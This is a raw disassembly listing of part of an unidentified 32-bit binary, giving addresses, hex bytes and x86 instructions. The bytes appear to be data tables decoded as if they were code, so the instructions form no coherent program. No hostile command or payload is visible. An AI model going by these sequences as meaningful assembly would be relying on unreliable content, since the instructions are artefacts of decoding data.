  4074cc:	81 01 6d 06 12 01    	addl   $0x112066d,(%ecx)
  4074d2:	79 01                	jns    0x4074d5
  4074d4:	86 06                	xchg   %al,(%esi)
  4074d6:	18 01                	sbb    %al,(%ecx)
  4074d8:	19 01                	sbb    %eax,(%ecx)
  4074da:	0a 06                	or     (%esi),%al
  4074dc:	1e                   	push   %ds
  4074dd:	01 89 01 96 06 24    	add    %ecx,0x24069601(%ecx)
  4074e3:	01 89 01 a1 06 7e    	add    %ecx,0x7e06a101(%ecx)
  4074e9:	00 71 01             	add    %dh,0x1(%ecx)
  4074ec:	ad                   	lods   %ds:(%esi),%eax
  4074ed:	06                   	push   %es
  4074ee:	2c 01                	sub    $0x1,%al
  4074f0:	89 01                	mov    %eax,(%ecx)
  4074f2:	96                   	xchg   %eax,%esi
  4074f3:	06                   	push   %es
  4074f4:	32 01                	xor    (%ecx),%al
  4074f6:	89 01                	mov    %eax,(%ecx)
  4074f8:	bc 06 39 01 91       	mov    $0x91013906,%esp
  4074fd:	01 d1                	add    %edx,%ecx
  4074ff:	06                   	push   %es
  407500:	3f                   	aas
  407501:	01 99 01 e4 06 a3    	add    %ebx,-0x5cf91bff(%ecx)
  407507:	00 11                	add    %dl,(%ecx)
  407509:	01 f6                	add    %esi,%esi
  40750b:	06                   	push   %es
  40750c:	44                   	inc    %esp
  40750d:	01 a9 01 05 07 4f    	add    %ebp,0x4f070501(%ecx)
  407513:	01 89 01 11 07 54    	add    %ecx,0x54071101(%ecx)
  407519:	01 f1                	add    %esi,%ecx
  40751b:	01 a6 07 5a 01 91    	add    %esp,-0x6efea5f9(%esi)
  407521:	01 b8 07 61 01 09    	add    %edi,0x9016107(%eax)
  407527:	02 d6                	add    %dh,%dl
  407529:	07                   	pop    %es
  40752a:	6b 01 91             	imul   $0xffffff91,(%ecx),%eax
  40752d:	01 db                	add    %ebx,%ebx
  40752f:	07                   	pop    %es
  407530:	79 01                	jns    0x407533
  407532:	e9 00 f0 07 7f       	jmp    0x7f486537
  407537:	01 99 01 fb 07 86    	add    %ebx,-0x79f804ff(%ecx)
  40753d:	01 19                	add    %ebx,(%ecx)
  40753f:	02 04 08             	add    (%eax,%ecx,1),%al
  407542:	8b 01                	mov    (%ecx),%eax
  407544:	79 01                	jns    0x407547
  407546:	11 07                	adc    %eax,(%edi)
  407548:	90                   	nop
  407549:	01 29                	add    %ebp,(%ecx)
  40754b:	02 d6                	add    %dh,%dl
  40754d:	07                   	pop    %es
  40754e:	af                   	scas   %es:(%edi),%eax
  40754f:	00 29                	add    %ch,(%ecx)
  407551:	02 23                	add    (%ebx),%ah
  407553:	08 af 00 31 02 2d    	or     %ch,0x2d023100(%edi)
  407559:	08 9a 01 39 02 3e    	or     %bl,0x3e023901(%edx)
  40755f:	08 9e 01 41 00 52    	or     %bl,0x52004101(%esi)
  407565:	08 a5 01 41 02 5c    	or     %ah,0x5c024101(%ebp)
  40756b:	08 06                	or     %al,(%esi)
  40756d:	00 41 02             	add    %al,0x2(%ecx)
  407570:	6f                   	outsl  %ds:(%esi),(%dx)
  407571:	08 ab 01 51 02 7e    	or     %ch,0x7e025101(%ebx)
  407577:	08 b3 01 c9 01 4a    	or     %dh,0x4a01c901(%ebx)
  40757d:	00 ba 01 59 01 4a    	add    %bh,0x4a015901(%edx)
  407583:	00 c2                	add    %al,%dl
  407585:	01 59 01             	add    %ebx,0x1(%ecx)
  407588:	b3 08                	mov    $0x8,%bl
  40758a:	cf                   	iret
  40758b:	01 39                	add    %edi,(%ecx)
  40758d:	02 ba 08 83 00 b1    	add    -0x4eff7cf8(%edx),%bh
  407593:	01 4a 00             	add    %ecx,0x0(%edx)
  407596:	06                   	push   %es
  407597:	00 b1 01 c1 08 10    	add    %dh,0x1008c101(%ecx)
  40759d:	00 39                	add    %bh,(%ecx)
  40759f:	02 ce                	add    %dh,%cl
  4075a1:	08 3f                	or     %bh,(%edi)
  4075a3:	01 19                	add    %ebx,(%ecx)
  4075a5:	01 0a                	add    %ecx,(%edx)
  4075a7:	06                   	push   %es
  4075a8:	d8 01                	fadds  (%ecx)
  4075aa:	39 01                	cmp    %eax,(%ecx)
  4075ac:	da 08                	fimull (%eax)
  4075ae:	e0 01                	loopne 0x4075b1
  4075b0:	19 01                	sbb    %eax,(%ecx)
  4075b2:	ec                   	in     (%dx),%al
  4075b3:	08 e6                	or     %ah,%dh
  4075b5:	01 d9                	add    %ebx,%ecx
  4075b7:	00 f6                	add    %dh,%dh
  4075b9:	08 eb                	or     %ch,%bl
  4075bb:	01 d9                	add    %ebx,%ecx
  4075bd:	00 fc                	add    %bh,%ah
  4075bf:	08 f3                	or     %dh,%bl
  4075c1:	01 b1 01 04 09 f8    	add    %esi,-0x7f6fbff(%ecx)
  4075c7:	01 31                	add    %esi,(%ecx)
  4075c9:	02 11                	add    (%ecx),%dl
  4075cb:	09 9a 01 01 01 21    	or     %ebx,0x21010101(%edx)
  4075d1:	09 33                	or     %esi,(%ebx)
  4075d3:	00 e9                	add    %ch,%cl
  4075d5:	00 7a 02             	add    %bh,0x2(%edx)
  4075d8:	a3 00 69 01 2d       	mov    %eax,0x2d016900
  4075dd:	09 fe                	or     %edi,%esi
  4075df:	01 69 01             	add    %ebp,0x1(%ecx)
  4075e2:	35 09 0d 02 39       	xor    $0x39020d09,%eax
  4075e7:	01 3d 09 1e 02 39    	add    %edi,0x39021e09
  4075ed:	01 50 09             	add    %edx,0x9(%eax)
  4075f0:	e0 01                	loopne 0x4075f3
  4075f2:	e9 00 c7 03 25       	jmp    0x25443cf7
  4075f7:	02 79 02             	add    0x2(%ecx),%bh
  4075fa:	60                   	pusha
  4075fb:	09 2a                	or     %ebp,(%edx)
  4075fd:	02 79 02             	add    0x2(%ecx),%bh
  407600:	72 09                	jb     0x40760b
  407602:	30 02                	xor    %al,(%edx)
  407604:	e1 01                	loope  0x407607
  407606:	7d 09                	jge    0x407611
  407608:	28 00                	sub    %al,(%eax)
  40760a:	e1 01                	loope  0x40760d
  40760c:	87 09                	xchg   %ecx,(%ecx)
  40760e:	28 00                	sub    %al,(%eax)
  407610:	d1 01                	roll   $1,(%ecx)
  407612:	4a                   	dec    %edx
  407613:	00 36                	add    %dh,(%esi)
  407615:	02 e9                	add    %cl,%ch
  407617:	01 bb 09 3f 02 89    	add    %edi,-0x76fdc0f7(%ebx)
  40761d:	02 7d 09             	add    0x9(%ebp),%bh
  407620:	28 00                	sub    %al,(%eax)
  407622:	89 02                	mov    %eax,(%edx)
  407624:	87 09                	xchg   %ecx,(%ecx)
  407626:	28 00                	sub    %al,(%eax)
  407628:	d9 01                	flds   (%ecx)
  40762a:	4a                   	dec    %edx
  40762b:	00 48 02             	add    %cl,0x2(%eax)
  40762e:	e9 01 d8 09 4e       	jmp    0x4e4a4e34
  407633:	02 29                	add    (%ecx),%ch
  407635:	02 ed                	add    %ch,%ch
  407637:	09 5c 02 e1          	or     %ebx,-0x1f(%edx,%eax,1)
  40763b:	01 4a 00             	add    %ecx,0x0(%edx)
  40763e:	62 02                	bound  %eax,(%edx)
  407640:	a1 02 02 0a 6c       	mov    0x6c0a0202,%eax
  407645:	02 29                	add    (%ecx),%ch
  407647:	02 0e                	add    (%esi),%cl
  407649:	0a 72 02             	or     0x2(%edx),%dh
  40764c:	e9 01 5e 05 06       	jmp    0x645d452
  407651:	00 d1                	add    %dl,%cl
  407653:	01 4a 00             	add    %ecx,0x0(%edx)
  407656:	48                   	dec    %eax
  407657:	02 e9                	add    %cl,%ch
  407659:	01 13                	add    %edx,(%ebx)
  40765b:	0a 7c 02 a9          	or     -0x57(%edx,%eax,1),%bh
  40765f:	02 29                	add    (%ecx),%ch
  407661:	0a 87 02 89 02 32    	or     0x32028902(%edi),%al
  407667:	0a 8d 02 d9 00 74    	or     0x7400d902(%ebp),%cl
  40766d:	04 97                	add    $0x97,%al
  40766f:	02 d9                	add    %cl,%bl
  407671:	00 37                	add    %dh,(%edi)
  407673:	0a 9b 02 89 02 5e    	or     0x5e028902(%ebx),%bl
  407679:	05 06 00 21 01       	add    $0x1210006,%eax
  40767e:	41                   	inc    %ecx
  40767f:	0a af 00 b1 02 57    	or     0x5702b100(%edi),%ch
  407685:	0a 33                	or     (%ebx),%dh
  407687:	00 f1                	add    %dh,%cl
  407689:	01 a6 07 a0 02 c1    	add    %esp,-0x3efd5ff9(%esi)
  40768f:	02 79 0a             	add    0xa(%ecx),%bh
  407692:	9a 01 c1 02 89 0a 9a 	lcall  $0x9a0a,$0x8902c101
  407699:	01 b1 02 96 0a a8    	add    %esi,-0x57f569fe(%ecx)
  40769f:	02 b9 02 a8 0a a8    	add    -0x57f557fe(%ecx),%bh
  4076a5:	02 b9 02 7a 02 ae    	add    -0x51fd85fe(%ecx),%bh
  4076ab:	02 81 01 be 0a b3    	add    -0x4cf541ff(%ecx),%al
  4076b1:	02 c9                	add    %cl,%cl
  4076b3:	02 c7                	add    %bh,%al
  4076b5:	0a 33                	or     (%ebx),%dh
  4076b7:	00 19                	add    %bl,(%ecx)
  4076b9:	01 d6                	add    %edx,%esi
  4076bb:	0a b9 02 c1 02 ee    	or     -0x11fd3efe(%ecx),%bh
  4076c1:	0a bf 02 d1 02 fc    	or     -0x3fd2efe(%edi),%bh
  4076c7:	0a 33                	or     (%ebx),%dh
  4076c9:	00 c1                	add    %al,%cl
  4076cb:	02 1a                	add    (%edx),%bl
  4076cd:	0b c5                	or     %ebp,%eax
  4076cf:	02 19                	add    (%ecx),%bl
  4076d1:	01 28                	add    %ebp,(%eax)
  4076d3:	0b cc                	or     %esp,%ecx
  4076d5:	02 89 01 4c 0b d1    	add    -0x2ef4b3ff(%ecx),%cl
  4076db:	02 89 01 59 0b db    	add    -0x24f4a6ff(%ecx),%cl
  4076e1:	02 f9                	add    %cl,%bh
  4076e3:	02 8f 0b 9a 01 39    	add    0x39019a0b(%edi),%cl
  4076e9:	02 a2 0b e0 02 39    	add    0x3902e00b(%edx),%ah
  4076ef:	02 b0 0b e8 02 39    	add    0x3902e80b(%eax),%dh
  4076f5:	02 b7 0b ed 02 79    	add    0x7902ed0b(%edi),%dh
  4076fb:	01 bc 0b 18 01 c9 00 	add    %edi,0xc90118(%ebx,%ecx,1)
  407702:	4a                   	dec    %edx
  407703:	00 f4                	add    %dh,%ah
  407705:	02 81 01 e6 0b fc    	add    -0x3f419ff(%ecx),%al
  40770b:	02 09                	add    (%ecx),%cl
  40770d:	03 0d 0c 02 03 11    	add    0x1103020c,%ecx
  407713:	03 24 0c             	add    (%esp,%ecx,1),%esp
  407716:	33 00                	xor    (%eax),%eax
  407718:	19 03                	sbb    %eax,(%ebx)
  40771a:	3f                   	aas
  40771b:	0c 08                	or     $0x8,%al
  40771d:	03 39                	add    (%ecx),%edi
  40771f:	02 b7 0b 0d 03 f1    	add    -0xefcf2f5(%edi),%dh
  407725:	02 4a 00             	add    0x0(%edx),%cl
  407728:	7e 00                	jle    0x40772a
  40772a:	21 03                	and    %eax,(%ebx)
  40772c:	5b                   	pop    %ebx
  40772d:	0c 7e                	or     $0x7e,%al
  40772f:	00 21                	add    %ah,(%ecx)
  407731:	03 5b 0c             	add    0xc(%ebx),%ebx
  407734:	54                   	push   %esp
  407735:	01 f1                	add    %esi,%ecx
  407737:	02 51 05             	add    0x5(%ecx),%dl
  40773a:	06                   	push   %es
  40773b:	00 91 01 65 0c 9a    	add    %dl,-0x65f39aff(%ecx)
  407741:	01 29                	add    %ebp,(%ecx)
  407743:	03 4a 00             	add    0x0(%edx),%ecx
  407746:	13 03                	adc    (%ebx),%eax
  407748:	31 03                	xor    %eax,(%ebx)
  40774a:	4a                   	dec    %edx
  40774b:	00 1b                	add    %bl,(%ebx)
  40774d:	03 41 01             	add    0x1(%ecx),%eax
  407750:	4a                   	dec    %edx
  407751:	00 21                	add    %ah,(%ecx)
  407753:	03 41 01             	add    0x1(%ecx),%eax
  407756:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  407757:	07                   	pop    %es
  407758:	06                   	push   %es
  407759:	00 41 01             	add    %al,0x1(%ecx)
  40775c:	4a                   	dec    %edx
  40775d:	00 29                	add    %ch,(%ecx)
  40775f:	03 39                	add    (%ecx),%edi
  407761:	03 4a 00             	add    0x0(%edx),%ecx
  407764:	1b 03                	sbb    (%ebx),%eax
  407766:	41                   	inc    %ecx
  407767:	03 a6 0c 30 03 f9    	add    -0x6fccff4(%esi),%esp
  40776d:	02 b8 0c af 00 f1    	add    -0xeff50f4(%eax),%bh
  407773:	01 c1                	add    %eax,%ecx
  407775:	0c 37                	or     $0x37,%al
  407777:	03 09                	add    (%ecx),%ecx
  407779:	01 53 04             	add    %edx,0x4(%ebx)
  40777c:	3d 03 f1 01 d3       	cmp    $0xd301f103,%eax
  407781:	0c 42                	or     $0x42,%al
  407783:	03 39                	add    (%ecx),%edi
  407785:	01 e5                	add    %esp,%ebp
  407787:	0c f3                	or     $0xf3,%al
  407789:	00 49 03             	add    %cl,0x3(%ecx)
  40778c:	4a                   	dec    %edx
  40778d:	00 06                	add    %al,(%esi)
  40778f:	00 51 03             	add    %dl,0x3(%ecx)
  407792:	4a                   	dec    %edx
  407793:	0d 47 03 e1 00       	or     $0xe10347,%eax
  407798:	7a 02                	jp     0x40779c
  40779a:	ae                   	scas   %es:(%edi),%al
  40779b:	02 f1                	add    %cl,%dh
  40779d:	00 5d 0d             	add    %bl,0xd(%ebp)
  4077a0:	4e                   	dec    %esi
  4077a1:	03 f1                	add    %ecx,%esi
  4077a3:	00 62 0d             	add    %ah,0xd(%edx)
  4077a6:	55                   	push   %ebp
  4077a7:	03 59 03             	add    0x3(%ecx),%ebx
  4077aa:	6d                   	insl   (%dx),%es:(%edi)
  4077ab:	0d 5c 03 79 00       	or     $0x79035c,%eax
  4077b0:	57                   	push   %edi
  4077b1:	0a 33                	or     (%ebx),%dh
  4077b3:	00 19                	add    %bl,(%ecx)
  4077b5:	01 76 0d             	add    %esi,0xd(%esi)
  4077b8:	cc                   	int3
  4077b9:	02 59 03             	add    0x3(%ecx),%bl
  4077bc:	7f 0d                	jg     0x4077cb
  4077be:	62 03                	bound  %eax,(%ebx)
  4077c0:	f1                   	int1
  4077c1:	00 8d 02 67 03 f1    	add    %cl,-0xefc98fe(%ebp)
  4077c7:	01 8c 0d 6c 03 c1 00 	add    %ecx,0xc1036c(%ebp,%ecx,1)
  4077ce:	97                   	xchg   %eax,%edi
  4077cf:	0d 28 00 59 01       	or     $0x1590028,%eax
  4077d4:	b0 0d                	mov    $0xd,%al
  4077d6:	70 03                	jo     0x4077db
  4077d8:	c1 00 c3             	roll   $0xc3,(%eax)
  4077db:	0d 78 03 51 01       	or     $0x1510378,%eax
  4077e0:	cd 0d                	int    $0xd
  4077e2:	28 00                	sub    %al,(%eax)
  4077e4:	e9 00 d6 0d 7e       	jmp    0x7e4e4de9
  4077e9:	03 11                	add    (%ecx),%edx
  4077eb:	01 dd                	add    %ebx,%ebp
  4077ed:	0d 83 03 71 03       	or     $0x3710383,%eax
  4077f2:	7a 02                	jp     0x4077f6
  4077f4:	33 00                	xor    (%eax),%eax
  4077f6:	59                   	pop    %ecx
  4077f7:	01 f3                	add    %esi,%ebx
  4077f9:	0d 88 03 81 03       	or     $0x3810388,%eax
  4077fe:	4a                   	dec    %edx
  4077ff:	00 1b                	add    %bl,(%ebx)
  407801:	03 41 01             	add    0x1(%ecx),%eax
  407804:	4a                   	dec    %edx
  407805:	00 93 03 41 01 a6    	add    %dl,-0x59febefd(%ebx)
  40780b:	07                   	pop    %es
  40780c:	9b                   	fwait
  40780d:	03 41 01             	add    0x1(%ecx),%eax
  407810:	14 0e                	adc    $0xe,%al
  407812:	a0 03 29 01 19       	mov    0x19012903,%al
  407817:	0e                   	push   %cs
  407818:	f8                   	clc
  407819:	01 61 01             	add    %esp,0x1(%ecx)
  40781c:	7a 02                	jp     0x407820
  40781e:	33 00                	xor    (%eax),%eax
  407820:	59                   	pop    %ecx
  407821:	01 22                	add    %esp,(%edx)
  407823:	0e                   	push   %cs
  407824:	88 03                	mov    %al,(%ebx)
  407826:	89 01                	mov    %eax,(%ecx)
  407828:	4c                   	dec    %esp
  407829:	0b 32                	or     (%edx),%esi
  40782b:	01 89 01 11 07 a5    	add    %ecx,-0x5af8eeff(%ecx)
  407831:	03 89 01 a1 06 ae    	add    -0x51f95eff(%ecx),%ecx
  407837:	03 89 01 27 0e ae    	add    -0x51f1d8ff(%ecx),%ecx
  40783d:	03 d9                	add    %ecx,%ebx
  40783f:	00 4a 00             	add    %cl,0x0(%edx)
  407842:	b4 03                	mov    $0x3,%ah
  407844:	89 03                	mov    %eax,(%ebx)
  407846:	4a                   	dec    %edx
  407847:	00 ba 03 d9 00 65    	add    %bh,0x6500d903(%edx)
  40784d:	0e                   	push   %cs
  40784e:	c4 03                	les    (%ebx),%eax
  407850:	d9 00                	flds   (%eax)
  407852:	72 0e                	jb     0x407862
  407854:	c9                   	leave
  407855:	03 99 03 84 0e d1    	add    -0x2ef17bfd(%ecx),%ebx
  40785b:	03 89 03 72 0e c9    	add    -0x36f18dfd(%ecx),%ecx
  407861:	03 f1                	add    %ecx,%esi
  407863:	01 91 0e d8 03 09    	add    %edx,0x903d80e(%ecx)
  407869:	01 84 0e 28 00 f1 01 	add    %eax,0x1f10028(%esi,%ecx,1)
  407870:	a0 0e 33 00 a9       	mov    0xa900330e,%al
  407875:	03 c0                	add    %eax,%eax
  407877:	0e                   	push   %cs
  407878:	df 03                	filds  (%ebx)
  40787a:	f1                   	int1
  40787b:	01 c8                	add    %ecx,%eax
  40787d:	0e                   	push   %cs
  40787e:	33 00                	xor    (%eax),%eax
  407880:	41                   	inc    %ecx
  407881:	00 e1                	add    %ah,%cl
  407883:	0e                   	push   %cs
  407884:	e5 03                	in     $0x3,%eax
  407886:	b1 03                	mov    $0x3,%cl
  407888:	ee                   	out    %al,(%dx)
  407889:	0e                   	push   %cs
  40788a:	eb 03                	jmp    0x40788f
  40788c:	b1 03                	mov    $0x3,%cl
  40788e:	ff 0e                	decl   (%esi)
  407890:	eb 03                	jmp    0x407895
  407892:	b9 03 7a 02 33       	mov    $0x33027a03,%ecx
  407897:	00 19                	add    %bl,(%ecx)
  407899:	01 11                	add    %edx,(%ecx)
  40789b:	0f 33                	rdpmc
  40789d:	00 c1                	add    %al,%cl
  40789f:	03 4a 00             	add    0x0(%edx),%ecx
  4078a2:	06                   	push   %es
  4078a3:	00 c1                	add    %al,%cl
  4078a5:	03 7a 02             	add    0x2(%edx),%edi
  4078a8:	33 00                	xor    (%eax),%eax
  4078aa:	b1 03                	mov    $0x3,%cl
  4078ac:	27                   	daa
  4078ad:	0f eb 03             	por    (%ebx),%mm0
  4078b0:	19 01                	sbb    %eax,(%ecx)
  4078b2:	37                   	aaa
  4078b3:	0f ef 03             	pxor   (%ebx),%mm0
  4078b6:	4c                   	dec    %esp
  4078b7:	00 4a 00             	add    %cl,0x0(%edx)
  4078ba:	06                   	push   %es
  4078bb:	00 4c 00 8d          	add    %cl,-0x73(%eax,%eax,1)
  4078bf:	0f fc 03             	paddb  (%ebx),%mm0
  4078c2:	09 01                	or     %eax,(%ecx)
  4078c4:	53                   	push   %ebx
  4078c5:	04 02                	add    $0x2,%al
  4078c7:	04 c1                	add    $0xc1,%al
  4078c9:	03 4a 00             	add    0x0(%edx),%ecx
  4078cc:	01 00                	add    %eax,(%eax)
  4078ce:	c1 03 91             	roll   $0x91,(%ebx)
  4078d1:	0f 28 00             	movaps (%eax),%xmm0
  4078d4:	4c                   	dec    %esp
  4078d5:	00 9e 0f 28 00 4c    	add    %bl,0x4c00280f(%esi)
  4078db:	00 a8 0f 07 04 4c    	add    %ch,0x4c04070f(%eax)
  4078e1:	00 b1 0f 06 00 4c    	add    %dh,0x4c00060f(%ecx)
  4078e7:	00 fc                	add    %bh,%ah
  4078e9:	08 0d 04 20 00 2b    	or     %cl,0x2b002004
  4078ef:	00 46 04             	add    %al,0x4(%esi)
  4078f2:	29 00                	sub    %eax,(%eax)
  4078f4:	fb                   	sti
  4078f5:	00 6b 06             	add    %ch,0x6(%ebx)
  4078f8:	2e 00 0b             	add    %cl,%cs:(%ebx)
  4078fb:	00 c5                	add    %al,%ch
  4078fd:	06                   	push   %es
  4078fe:	2e 00 13             	add    %dl,%cs:(%ebx)
  407901:	00 ce                	add    %cl,%dh
  407903:	06                   	push   %es
  407904:	40                   	inc    %eax
  407905:	00 1b                	add    %bl,(%ebx)
  407907:	00 25 04 40 00 3b    	add    %ah,0x3b004004
  40790d:	00 46 04             	add    %al,0x4(%esi)
  407910:	43                   	inc    %ebx
  407911:	00 1b                	add    %bl,(%ebx)
  407913:	00 25 04 43 00 23    	add    %ah,0x23004304
  407919:	00 2e                	add    %ch,(%esi)
  40791b:	04 49                	add    $0x49,%al
  40791d:	00 fb                	add    %bh,%bl
  40791f:	00 81 06 60 00 2b    	add    %al,0x2b006006(%ecx)
  407925:	00 46 04             	add    %al,0x4(%esi)
  407928:	63 00                	arpl   %eax,(%eax)
  40792a:	1b 00                	sbb    (%eax),%eax
  40792c:	25 04 63 00 23       	and    $0x23006304,%eax
  407931:	00 2e                	add    %ch,(%esi)
  407933:	04 69                	add    $0x69,%al
  407935:	00 fb                	add    %bh,%bl
  407937:	00 9a 06 80 00 3b    	add    %bl,0x3b008006(%edx)
  40793d:	00 46 04             	add    %al,0x4(%esi)
  407940:	83 00 23             	addl   $0x23,(%eax)
  407943:	00 2e                	add    %ch,(%esi)
  407945:	04 83                	add    $0x83,%al
  407947:	00 4b 00             	add    %cl,0x0(%ebx)
  40794a:	46                   	inc    %esi
  40794b:	04 83                	add    $0x83,%al
  40794d:	00 53 00             	add    %dl,0x0(%ebx)
  407950:	46                   	inc    %esi
  407951:	04 89                	add    $0x89,%al
  407953:	00 fb                	add    %bh,%bl
  407955:	00 ac 06 a0 00 3b 00 	add    %ch,0x3b00a0(%esi,%eax,1)
  40795c:	46                   	inc    %esi
  40795d:	04 a1                	add    $0xa1,%al
  40795f:	00 a3 00 46 04 a1    	add    %ah,-0x5efbba00(%ebx)
  407965:	00 ab 00 46 04 a3    	add    %ch,-0x5cfbba00(%ebx)
  40796b:	00 1b                	add    %bl,(%ebx)
  40796d:	00 25 04 a3 00 5b    	add    %ah,0x5b00a304
  407973:	00 4b 04             	add    %cl,0x4(%ebx)
  407976:	c0 00 3b             	rolb   $0x3b,(%eax)
  407979:	00 46 04             	add    %al,0x4(%esi)
  40797c:	c3                   	ret
  40797d:	00 9b 00 ad 04 c3    	add    %bl,-0x3cfb5300(%ebx)
  407983:	00 1b                	add    %bl,(%ebx)
  407985:	00 25 04 e0 00 3b    	add    %ah,0x3b00e004
  40798b:	00 46 04             	add    %al,0x4(%esi)
  40798e:	00 01                	add    %al,(%ecx)
  407990:	3b 00                	cmp    (%eax),%eax
  407992:	46                   	inc    %esi
  407993:	04 00                	add    $0x0,%al
  407995:	01 1b                	add    %ebx,(%ebx)
  407997:	00 25 04 20 01 3b    	add    %ah,0x3b012004
  40799d:	00 46 04             	add    %al,0x4(%esi)
  4079a0:	20 01                	and    %al,(%ecx)
  4079a2:	1b 00                	sbb    (%eax),%eax
  4079a4:	25 04 40 01 1b       	and    $0x1b014004,%eax
  4079a9:	00 25 04 40 01 3b    	add    %ah,0x3b014004
  4079af:	00 46 04             	add    %al,0x4(%esi)
  4079b2:	60                   	pusha
  4079b3:	01 3b                	add    %edi,(%ebx)
  4079b5:	00 46 04             	add    %al,0x4(%esi)
  4079b8:	60                   	pusha
  4079b9:	01 1b                	add    %ebx,(%ebx)
  4079bb:	00 25 04 80 01 3b    	add    %ah,0x3b018004
  4079c1:	00 46 04             	add    %al,0x4(%esi)
  4079c4:	a0 01 3b 00 46       	mov    0x46003b01,%al
  4079c9:	04 c0                	add    $0xc0,%al
  4079cb:	01 1b                	add    %ebx,(%ebx)
  4079cd:	00 25 04 c0 01 3b    	add    %ah,0x3b01c004
  4079d3:	00 46 04             	add    %al,0x4(%esi)
  4079d6:	e0 01                	loopne 0x4079d9
  4079d8:	3b 00                	cmp    (%eax),%eax
  4079da:	46                   	inc    %esi
  4079db:	04 00                	add    $0x0,%al
  4079dd:	02 1b                	add    (%ebx),%bl
  4079df:	00 25 04 00 02 3b    	add    %ah,0x3b020004
  4079e5:	00 46 04             	add    %al,0x4(%esi)
  4079e8:	20 02                	and    %al,(%edx)
  4079ea:	2b 00                	sub    (%eax),%eax
  4079ec:	46                   	inc    %esi
  4079ed:	04 40                	add    $0x40,%al
  4079ef:	02 03                	add    (%ebx),%al
  4079f1:	01 46 04             	add    %eax,0x4(%esi)
  4079f4:	80 02 2b             	addb   $0x2b,(%edx)
  4079f7:	00 46 04             	add    %al,0x4(%esi)
  4079fa:	11 00                	adc    %eax,(%eax)
  4079fc:	50                   	push   %eax
  4079fd:	05 13 00 50 05       	add    $0x5500013,%eax
  407a02:	1d 00 50 05 23       	sbb    $0x23055000,%eax
  407a07:	00 50 05             	add    %dl,0x5(%eax)
  407a0a:	2b 00                	sub    (%eax),%eax
  407a0c:	50                   	push   %eax
  407a0d:	05 2f 00 50 05       	add    $0x550002f,%eax
  407a12:	5d                   	pop    %ebp
  407a13:	00 50 05             	add    %dl,0x5(%eax)
  407a16:	5f                   	pop    %edi
  407a17:	00 50 05             	add    %dl,0x5(%eax)
  407a1a:	a1 00 0f 06 b5       	mov    0xb5060f00,%eax
  407a1f:	00 50 05             	add    %dl,0x5(%eax)
  407a22:	bf 00 50 05 ed       	mov    $0xed055000,%edi
  407a27:	06                   	push   %es
  407a28:	f2 06                	repnz push %es
  407a2a:	f7 06 fc 06 01 07    	testl  $0x70106fc,(%esi)
  407a30:	05 07 09 07 0e       	add    $0xe070907,%eax
  407a35:	07                   	pop    %es
  407a36:	12 07                	adc    (%edi),%al
  407a38:	18 07                	sbb    %al,(%edi)
  407a3a:	1d 07 23 07 2e       	sbb    $0x2e072307,%eax
  407a3f:	07                   	pop    %es
  407a40:	39 07                	cmp    %eax,(%edi)
  407a42:	44                   	inc    %esp
  407a43:	07                   	pop    %es
  407a44:	64 07                	fs pop %es
  407a46:	6a 07                	push   $0x7
  407a48:	70 07                	jo     0x407a51
  407a4a:	77 07                	ja     0x407a53
  407a4c:	86 07                	xchg   %al,(%edi)
  407a4e:	8d 07                	lea    (%edi),%eax
  407a50:	93                   	xchg   %eax,%ebx
  407a51:	07                   	pop    %es
  407a52:	41                   	inc    %ecx
  407a53:	08 70 08             	or     %dh,0x8(%eax)
  407a56:	9c                   	pushf
  407a57:	08 c8                	or     %cl,%al
  407a59:	08 d2                	or     %dl,%dl
  407a5b:	08 e8                	or     %ch,%al
  407a5d:	08 ff                	or     %bh,%bh
  407a5f:	08 04 09             	or     %al,(%ecx,%ecx,1)
  407a62:	1c 09                	sbb    $0x9,%al
  407a64:	23 09                	and    (%ecx),%ecx
  407a66:	3c 09                	cmp    $0x9,%al
  407a68:	4b                   	dec    %ebx
  407a69:	09 60 09             	or     %esp,0x9(%eax)
  407a6c:	72 09                	jb     0x407a77
  407a6e:	85 09                	test   %ecx,(%ecx)
  407a70:	93                   	xchg   %eax,%ebx
  407a71:	09 b0 09 04 00 01    	or     %esi,0x1000409(%eax)
  407a77:	00 06                	add    %al,(%esi)
  407a79:	00 05 00 00 00 69    	add    %al,0x69000000
  407a7f:	01 66 06             	add    %esp,0x6(%esi)
  407a82:	00 00                	add    %al,(%eax)
  407a84:	83 0b 7c             	orl    $0x7c,(%ebx)
  407a87:	06                   	push   %es
  407a88:	00 00                	add    %al,(%eax)
  407a8a:	14 03                	adc    $0x3,%al
  407a8c:	95                   	xchg   %eax,%ebp
  407a8d:	06                   	push   %es
  407a8e:	00 00                	add    %al,(%eax)
  407a90:	2c 17                	sub    $0x17,%al
  407a92:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  407a93:	06                   	push   %es
  407a94:	00 00                	add    %al,(%eax)
  407a96:	38 17                	cmp    %dl,(%edi)
  407a98:	c0 06 02             	rolb   $0x2,(%esi)
  407a9b:	00 04 00             	add    %al,(%eax,%eax,1)
  407a9e:	03 00                	add    (%eax),%eax
  407aa0:	02 00                	add    (%eax),%al
  407aa2:	05 00 05 00 02       	add    $0x2000500,%eax
  407aa7:	00 06                	add    %al,(%esi)
  407aa9:	00 07                	add    %al,(%edi)
  407aab:	00 02                	add    %al,(%edx)
  407aad:	00 07                	add    %al,(%edi)
  407aaf:	00 09                	add    %cl,(%ecx)
  407ab1:	00 02                	add    %al,(%edx)
  407ab3:	00 0f                	add    %cl,(%edi)
  407ab5:	00 0b                	add    %cl,(%ebx)
  407ab7:	00 bd 0f c4 0f cf    	add    %bh,-0x30f03bf1(%ebp)
  407abd:	0f d9 0f             	psubusw (%edi),%mm1
  407ac0:	e6 0f                	out    %al,$0xf
  407ac2:	ef                   	out    %eax,(%dx)
  407ac3:	0f f5 0f             	pmaddwd (%edi),%mm1
  407ac6:	37                   	aaa
  407ac7:	00 4a 00             	add    %cl,0x0(%edx)
  407aca:	55                   	push   %ebp
  407acb:	00 5d 00             	add    %bl,0x0(%ebp)
  407ace:	64 00 6b 00          	add    %ch,%fs:0x0(%ebx)
  407ad2:	72 00                	jb     0x407ad4
  407ad4:	92                   	xchg   %eax,%edx
  407ad5:	00 f5                	add    %dh,%ch
  407ad7:	03 43 01             	add    0x1(%ebx),%eax
  407ada:	35 00 08 12 02       	xor    $0x2120800,%eax
  407adf:	00 43 01             	add    %al,0x1(%ebx)
  407ae2:	37                   	aaa
  407ae3:	00 31                	add    %dh,(%ecx)
  407ae5:	12 05 00 43 01 39    	adc    0x39014300,%al
  407aeb:	00 f2                	add    %dh,%dl
  407aed:	12 02                	adc    (%edx),%al
